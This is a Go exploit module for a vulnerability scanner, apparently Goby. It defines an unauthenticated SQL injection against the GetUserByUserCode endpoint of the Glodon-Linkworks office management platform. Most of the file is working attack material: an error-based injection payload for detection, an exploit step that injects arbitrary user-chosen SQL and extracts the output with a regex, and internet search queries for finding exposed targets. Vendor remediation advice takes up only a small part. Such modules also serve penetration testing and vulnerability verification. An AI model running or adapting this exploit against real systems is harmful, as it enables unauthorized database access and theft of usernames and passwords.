package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Glodon-Linkworks Collaborative Office Management Platform /Org/service/Service.asmx/GetUserByUserCode SQL Injection Vulnerability",
    "Description": "<p>Glodon-Linkworks Collaborative Office Management Platform is a management system focused on the entire lifecycle of engineering projects, providing digital hardware and software products and solutions. Multiple interfaces of this platform (such as GetUserByEmployeeCode, GetUserByUserCode, EmailAccountOrgUserService.asmx, DataExchange.ashx) have SQL injection vulnerabilities. Unauthorized attackers can use these interfaces to obtain sensitive information such as usernames and passwords, potentially leading to data leakage and system control.</p>",
    "Product": "Glodon-Linkworks Collaborative Office Management Platform",
    "Homepage": "https://www.glodon.com/",
    "DisclosureDate": "2024-06-05",
    "PostTime": "2025-01-15",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\"",
    "GobyQuery": "body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows unauthorized attackers to obtain sensitive information such as usernames and passwords through SQL injection, potentially leading to data leakage, privilege escalation, and complete system control.</p>",
    "Recommendation": "<p>It is recommended to immediately apply the latest security patches released by the vendor to fix the vulnerabilities. Additionally, it is advised to close the internet exposure or set interface access permissions to restrict unauthorized access.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/134997188"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT USER,SELECT SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT USER",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Org/service/Service.asmx/GetUserByUserCode?EncryptData=1&userCode=1%27+AND+5598+IN+%28SELECT+%28CHAR%2868%29%2BCHAR%2851%29%2BCHAR%2870%29%2BCHAR%2855%29%2BCHAR%2871%29%2BCHAR%2850%29%2BCHAR%2865%29%2BCHAR%2857%29%2BCHAR%2866%29%2BCHAR%2854%29%2BCHAR%2872%29%2BCHAR%2856%29%2BCHAR%2875%29%2BCHAR%2849%29%2BCHAR%2877%29%2BCHAR%2853%29%2BCHAR%2878%29%2BCHAR%2848%29%2BCHAR%2881%29%2B%28SELECT+%271%27%29%2BCHAR%2852%29%2BCHAR%2880%29%2BCHAR%2855%29%2BCHAR%2882%29%2BCHAR%2850%29%2BCHAR%2883%29%2BCHAR%2856%29%2BCHAR%2884%29%2BCHAR%2857%29%2BCHAR%2887%29%2BCHAR%2854%29%2BCHAR%2886%29%2BCHAR%2851%29%2BCHAR%2888%29%2BCHAR%2848%29%2BCHAR%2889%29%2BCHAR%2852%29%2BCHAR%2890%29%2BCHAR%2850%29%29%29+AND+%27EDll%27%3D%27EDll",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "D3F7G2A9B6H8K1M5N0Q14P7R2S8T9W6V3X0Y4Z2",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/Org/service/Service.asmx/GetUserByUserCode?EncryptData=1&userCode=1%27+AND+5598+IN+%28SELECT+%28CHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%2B%28{{{payload_encode}}}%29%2BCHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%29%29+AND+%27EDll%27%3D%27EDll",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([^'][\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "广联达-Linkworks 协同办公管理平台 /Org/service/Service.asmx/GetUserByUserCode SQL 注入漏洞",
            "Product": "广联达-Linkworks",
            "Description": "<p>广联达-Linkworks协同办公管理平台是一款围绕工程项目全生命周期的管理系统，为客户提供数字化软硬件产品及解决方案。该平台的多个接口（如 GetUserByEmployeeCode、GetUserByUserCode、EmailAccountOrgUserService.asmx、DataExchange.ashx）存在SQL注入漏洞，未经身份认证的攻击者可通过这些接口获取用户名、密码等敏感信息，可能导致数据泄露和系统被控制。</p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"http://www.glodon.com/2\">www.glodon.com/2</a>、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>该漏洞允许未经身份认证的攻击者通过SQL注入获取敏感信息，如用户名和密码，可能导致数据泄露、权限提升以及系统被完全控制等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Glodon-Linkworks Collaborative Office Management Platform /Org/service/Service.asmx/GetUserByUserCode SQL Injection Vulnerability",
            "Product": "Glodon-Linkworks Collaborative Office Management Platform",
            "Description": "<p>Glodon-Linkworks Collaborative Office Management Platform is a management system focused on the entire lifecycle of engineering projects, providing digital hardware and software products and solutions. Multiple interfaces of this platform (such as GetUserByEmployeeCode, GetUserByUserCode, EmailAccountOrgUserService.asmx, DataExchange.ashx) have SQL injection vulnerabilities. Unauthorized attackers can use these interfaces to obtain sensitive information such as usernames and passwords, potentially leading to data leakage and system control.</p>",
            "Recommendation": "<p>It is recommended to immediately apply the latest security patches released by the vendor to fix the vulnerabilities. Additionally, it is advised to close the internet exposure or set interface access permissions to restrict unauthorized access.</p>",
            "Impact": "<p>This vulnerability allows unauthorized attackers to obtain sensitive information such as usernames and passwords through SQL injection, potentially leading to data leakage, privilege escalation, and complete system control.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}